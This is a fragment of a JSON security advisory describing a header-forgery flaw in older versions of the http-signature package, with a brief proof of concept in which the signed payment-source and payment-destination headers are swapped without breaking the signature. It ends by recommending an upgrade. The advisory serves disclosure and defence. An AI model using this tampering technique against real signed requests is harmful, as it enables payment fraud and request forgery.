  ],
  "summary": "Header Forgery in http-signature",
  "details": "Affected versions of `http-signature` contain a vulnerability which can allow an attacker in a privileged network position to modify header names and change the meaning of the request, without requiring an updated signature. \n\nThis problem occurs because vulnerable versions of `http-signature` sign the contents of headers, but not the header names.\n\n## Proof of Concept\n\nConsider this to be the initial, untampered request:\n```\nPOST /pay HTTP/1.1\nHost: example.com\nDate: Thu, 05 Jan 2012 21:31:40 GMT\nX-Payment-Source: src@money.com\nX-Payment-Destination: dst@money.com\nAuthorization: Signature keyId=\"Test\",algorithm=\"rsa-sha256\",headers=\"x-payment-source x-payment-destination\" MDyO5tSvin5...\n```\n\nAnd the request is intercepted and tampered as follows:\n```\nX-Payment-Source: dst@money.com // Emails switched\nX-Payment-Destination: src@money.com\nAuthorization: Signature keyId=\"Test\",algorithm=\"rsa-sha256\",headers=\"x-payment-destination x-payment-source\" MDyO5tSvin5...\n```\n\nIn the resulting responses, both requests would pass signature verification without issue.\n```\nsrc@money.com\\n\ndst@money.com\\n\n```\n\n\n\n## Recommendation\n\nUpdate to version 0.10.0 or higher.",
